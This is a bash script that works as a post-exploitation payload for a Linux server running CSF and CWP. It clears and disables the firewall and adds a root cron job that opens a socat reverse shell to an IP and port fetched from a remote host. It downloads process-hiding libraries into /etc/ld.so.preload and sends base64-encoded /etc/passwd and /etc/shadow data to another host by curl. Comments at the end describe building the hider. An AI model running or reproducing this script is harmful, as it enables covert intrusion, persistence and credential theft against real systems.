#!/bin/bash
$(which cat) /dev/null > /etc/csf/csf.deny
$(which csf) -x & wait
$(which systemctl) stop csf.service & wait

pathenv=$(printenv PATH)
event="DISPLAY=:0\nPATH=\"$pathenv\"\n*/1 * * * * ip=\$(curl -s http://192.168.1.15:2080/ | cut -d '\"' -f 4); port=\$(curl -s http://192.168.1.15:2080/ | cut -d '\"' -f 8); $(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:\$ip:\$port,verify=0"
crontab -u root -l | grep "/usr/local/cwp/php71/bin/php" | crontab -u root -
(crontab -l; printf "$event\n") | crontab -

wget -q http://172.16.1.100/libprocesshider-sh.so -O /tmp/libsh.so & wait
wget -q http://172.16.1.100/libprocesshider-socat.so -O /tmp/libsocat.so & wait

mv /tmp/libsh.so /tmp/libsocat.so /usr/local/lib/
echo /usr/local/lib/libsh.so >> /etc/ld.so.preload
echo /usr/local/lib/libsocat.so >> /etc/ld.so.preload

passwd=$(cat /etc/passwd | grep home | base64 | tr -d '\n')
arr_pwd=$(cat /etc/passwd | grep home | cut -d ':' -f 1)
shadow=$(cat /etc/shadow | grep "$arr_pwd" | base64 | tr -d '\n')            

curl -s -q --data {\"DATA\":{\"PASSWD\":\"$passwd\"}} -X PATCH http://192.168.1.14:2080/ -o /dev/null
curl -s -q --data {\"DATA\":{\"SHADOW\":\"$shadow\"}} -X PATCH http://192.168.1.14:2080/ -o /dev/null

$(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.1.15:6666,verify=0

# attacker ---------
# git clone https://github.com/gianlucaborello/libprocesshider.git
# cd libprocesshider
# nano processhider.c >> static const char* process_to_filter = "/usr/bin/socat"; "/bin/sh"
# make ~~~ libprocesshider-cron.so && libprocesshider-socat.so

# payload ---------
# cat libprocesshider.so | base64 ~~ to API
# mv libprocesshider.so /usr/local/lib/
# echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
# cat /dev/null > /etc/ld.so.preload
